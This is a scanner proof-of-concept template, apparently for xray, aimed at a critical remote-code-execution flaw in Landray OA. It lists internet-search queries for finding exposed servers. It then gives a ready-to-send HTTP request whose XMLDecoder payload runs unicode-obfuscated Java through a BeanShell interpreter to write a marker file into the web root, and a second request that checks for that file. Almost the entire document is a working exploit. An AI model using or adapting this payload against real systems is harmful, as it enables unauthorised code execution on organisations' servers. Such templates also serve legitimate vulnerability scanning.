detail:
  author: 
  links:
    - x
  vulnerability:
    level: critical
    fofa-query: app="Landray-OA系统"
    hunter-query: app.name="Landray 蓝凌OA"
    quake-query: favicon:"302464c3f6207d57240649926cfc7bd4"
    zoomeye-query: app:"蓝凌数字OA"
    threatbook-query: 
    cve: 
    cnvd:
    tips: /login4ndex.txt ||  D:/OA/ekp/login4ndex.txt
    
name: poc-yaml-Landray-sysSearchMain.do-upload
manual: true
transport: http
set:
    s1: randomInt(1000000000, 9000000000)
    s2: randomLowercase(8)
    reverse: newReverse()
    reverseURL: reverse.url
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /sys/ui/extend/varkind/custom.jsp
            headers:
              Content-type: application/x-www-form-urlencoded
            body: var={"body":{"file":"/sys/search/sys_search_main/sysSearchMain.do?method=editParam"}}&fdParemNames=11&fdParameters=<java><void class="bsh.Interpreter"><void%20method=%22eval%22><string>\u0069\u006d\u0070\u006f\u0072\u0074\u0020\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u002a\u003b\u0069\u006d\u0070\u006f\u0072\u0074\u0020\u006a\u0061\u0076\u0061\u002e\u0069\u006f\u002e\u002a\u003b\u0043\u006c\u0061\u0073\u0073\u0020\u0063\u006c\u0073\u003d\u0054\u0068\u0072\u0065\u0061\u0064\u002e\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u0054\u0068\u0072\u0065\u0061\u0064\u0028\u0029\u002e\u0067\u0065\u0074\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072\u0028\u0029\u002e\u006c\u006f\u0061\u0064\u0043\u006c\u0061\u0073\u0073\u0028\u0022\u0062\u0073\u0068\u002e\u0049\u006e\u0074\u0065\u0072\u0070\u0072\u0065\u0074\u0065\u0072\u0022\u0029\u003b\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0070\u0061\u0074\u0068\u003d\u0063\u006c\u0073\u002e\u0067\u0065\u0074\u0050\u0072\u006f\u0074\u0065\u0063\u0074\u0069\u006f\u006e\u0044\u006f\u006d\u0061\u0069\u006e\u0028\u0029\u002e\u0067\u0065\u0074\u0043\u006f\u0064\u0065\u0053\u006f\u0075\u0072\u0063\u0065\u0028\u0029\u002e\u0067\u0065\u0074\u004c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u0028\u0029\u002e\u0067\u0065\u0074\u0050\u0061\u0074\u0068\u0028\u0029\u003b\u0046\u0069\u006c\u0065\u0020\u0066\u003d\u006e\u0065\u0077\u0020\u0046\u0069\u006c\u0065\u0028\u0070\u0061\u0074\u0068\u002e\u0073\u0070\u006c\u0069\u0074\u0028\u0022\u0057\u0045\u0042\u002d\u0049\u004e\u0046\u0022\u0029\u005b\u0030\u005d\u002b\u0022\u002f\u006c\u006f\u0067\u0069\u006e\u0034\u006e\u0064\u0065\u0078\u002e\u0074\u0078\u0074\u0022\u0029\u003b\u0066\u002e\u0063\u0072\u0065\u0061\u0074\u0065\u004e\u0065\u0077\u0046\u0069\u006c\u0065\u0028\u0029\u003b\u0046\u0069\u006c\u0065\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0066\u006f\u0075\u0074\u003d\u006e\u0065\u0077\u0020\u0046\u0069\u006c\u0065\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0066\u0029\u003b\u0066\u006f\u0075\u0074\u002e\u0077\u0072\u0069\u0074\u0065\u0028\u006e\u0065\u0077\u0020\u0073\u0075\u006e\u002e\u006d\u0069\u0073\u0063\u002e\u0042\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072\u0028\u0029\u002e\u0064\u0065\u0063\u006f\u0064\u0065\u0042\u0075\u0066\u0066\u0065\u0072\u0028\u0022\u004e\u0048\u004a\u0068\u004d\u0057\u0034\u003d\u0022\u0029\u0029\u003b\u0066\u006f\u0075\u0074\u002e\u0063\u006c\u006f\u0073\u0065\u0028\u0029</string></void></void></java>            
        expression: response.status == 200 && response.raw_header.bcontains(b"text/html")
    r1:
        request:
            cache: true
            method: GET
            path: /login4ndex.txt
            headers:
            body:   
        expression: response.body_string.contains("4ra1n")

expression: r0() && r1()
